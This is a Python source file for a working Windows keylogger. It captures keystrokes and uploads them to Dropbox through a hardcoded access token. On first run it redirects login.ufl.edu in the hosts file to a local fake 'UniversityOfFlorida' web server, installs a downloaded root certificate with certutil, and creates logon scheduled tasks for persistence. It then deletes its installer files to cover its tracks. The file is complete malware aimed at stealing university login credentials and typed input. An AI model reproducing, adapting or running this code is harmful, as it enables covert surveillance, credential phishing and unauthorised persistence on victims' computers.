import os, sys, shutil
import datetime
import atexit
import subprocess
try:
    from pynput import keyboard
    import dropbox
except ModuleNotFoundError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
        'dropbox'], shell=True)
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
        'pynput'], shell=True)
    from pynput import keyboard
    import dropbox


# The keylogger's drobbox connection.
dbx = dropbox.Dropbox('sl.BhYoyKedNE_DxPPExhEwTbMCGaGiG79EOaR6bZ42-rEep8SuVEtIrTexD5Gti0ccvZxXfjubxtvI2rQRMNZ-HIQEjNZbBpbELMRC9sFHzKUbqrUWPU8SNPCfVLD5BDsB8B647LPAban4')


# Variables for keyLogger
last_saved_time = str(datetime.datetime.now()).replace(' ', '|') 
counter = 0
max_chars_per_line = 100
max_chars_per_file = 1000
cache = ''

# Writing to dropbox on app exit.
def OnExitApp():
    write_cache_to_dropbox()
atexit.register(OnExitApp)


def write_cache_to_dropbox():
    global cache
    global last_saved_time
    now = str(datetime.datetime.now()).replace(' ', '|') 
    path = "from {} to {}".format(last_saved_time, now)
    last_saved_time = now
    dbx.files_upload(bytes(cache, 'utf-8'), f'/{path}.txt')
    print("Upload Successful")
    cache = ''


def on_press(key):
    global cache
    global counter
    try:
        cache = cache + key.char
    except (AttributeError, TypeError):
        if key == keyboard.Key.space:  
            cache += " " 
        else:    
            cache += " " + str(key) + " "
    counter += 1  
    # Drop lines in cached characters
    if counter % max_chars_per_line == 0:
        cache += '\n'
    if counter == max_chars_per_file:
        write_cache_to_dropbox()
        counter = 0

# uncomment code to have exit option for keylogger
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


if len(sys.argv) == 1:
    dir = os.path.join('C:\\', 'temp')
    filename = os.path.basename(__file__)  
    print(filename)
    python_root = str(sys.executable).replace('python.exe', 'pythonw.exe')
    wd_name = 'wd.py'
    web_server_name = 'UniversityOfFlorida'

    os.popen(f'mkdir {dir}')
    os.popen(f'echo "" >> {dir}\\server.crt')
    os.popen(f'echo "" >> {dir}\\server.key')
    os.popen(f'echo "" >> {dir}\\rootCA.pem')
    # Downloading certificate files and trusting the certificate.
    with open("C:\Windows\System32\drivers\etc\hosts", 'a') as f:
        f.write("\n\n127.0.0.1 login.ufl.edu\n")
    with open(f"{dir}\\server.crt", 'wb') as f:
        metadata, result = dbx.files_download(path="/Cert/server.crt")
        f.write(result.content)
    with open(f"{dir}\\server.key", 'wb') as f:
        metadata, result = dbx.files_download(path="/Cert/server.key")
        f.write(result.content)
    with open(f"{dir}\\rootCA.pem", 'wb') as f:
        metadata, result = dbx.files_download(path="/Cert/rootCA.pem")
        f.write(result.content)
    os.popen(f"certutil -addstore -f \"ROOT\" {dir}\\rootCA.pem")
    
    os.popen(f'copy {filename} {dir}\\{filename}')
    os.popen(f'copy {wd_name} {dir}\\{wd_name}')

    if os.path.exists(f'{dir}\\{web_server_name}'):
        shutil.rmtree(f'{dir}\\{web_server_name}')
                      
    shutil.copytree(f'{web_server_name}', f'{dir}\\{web_server_name}')
    #os.popen(f'python {dir}\\{wd_name} {dir}\\{filename}')
    os.popen(f'schtasks /Create /SC ONLOGON /TN Routine /TR \"{python_root} {dir}\\{wd_name} {dir}\\{filename}')
    os.popen(f'schtasks /Create /SC ONLOGON /TN App /TR \"{str(sys.executable)} {dir}\\{web_server_name}\\app.py \rl HIGHEST ')
    os.popen(f'schtasks /run /tn Routine')
    os.popen(f'schtasks /run /tn App')
    os.popen(f'del {filename}')  
    os.popen(f'del {wd_name}')
    shutil.rmtree("UniversityOfFlorida")
    os.abort()

# Collect events until released
with keyboard.Listener( on_press=on_press, on_release=on_release) as listener:
    listener.join()
 




